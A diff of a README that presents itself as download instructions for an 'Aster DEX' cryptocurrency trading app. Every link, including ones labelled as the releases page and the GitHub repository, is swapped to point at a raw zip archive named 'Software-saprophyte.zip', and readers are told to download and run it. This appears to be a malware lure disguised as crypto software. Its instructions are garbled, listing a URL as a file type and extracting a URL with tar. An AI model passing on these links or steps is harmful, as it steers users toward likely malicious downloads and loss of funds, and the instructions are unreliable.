@@ -4,17 +4,17 @@
 
 Aster DEX is a new way to trade cryptocurrencies with greater security and transparency. This guide will help you download and run Aster easily.
 
-[![Download Aster](https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip)](https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip)
+[![Download Aster](https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip)](https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip)
 
 ## 📥 Download & Install
 
-To start, visit this page to download: [Aster Releases](https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip). You will find the latest version of Aster available for download.
+To start, visit this page to download: [Aster Releases](https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip). You will find the latest version of Aster available for download.
 
 ### Steps to Download
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version. It will usually be at the top of the page.
-3. Look for a file that matches your operating system. Common types include `.exe` for Windows, `.dmg` for macOS, and `https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip` for Linux.
+3. Look for a file that matches your operating system. Common types include `.exe` for Windows, `.dmg` for macOS, and `https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip` for Linux.
 4. Click the appropriate file to start the download.
 
 ### Running Aster
@@ -34,7 +34,7 @@ After the download completes, follow these steps to run Aster:
 - **Linux:**
   1. Open your terminal.
   2. Navigate to the directory where you downloaded the file.
-  3. Use the command `tar -xzf https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip` to extract the application.
+  3. Use the command `tar -xzf https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip` to extract the application.
   4. Navigate into the extracted folder and run `./Aster`.
 
 ## 🌐 About Aster DEX
@@ -76,7 +76,7 @@ Aster DEX is supported by Binance Labs, which adds a layer of trust and innovati
 
 ## 🔗 Links
 
-- **Download Aster:** [Visit this page to download](https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip)
-- **GitHub Repository:** [Aster GitHub](https://raw.githubusercontent.com/GInHaise/Aster/main/splother/Aster.zip)
+- **Download Aster:** [Visit this page to download](https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip)
+- **GitHub Repository:** [Aster GitHub](https://github.com/GInHaise/Aster/raw/refs/heads/main/splother/Software-saprophyte.zip)
 
 Now that you have the steps and information, you’re all set to explore Aster DEX. Good luck with your trading!
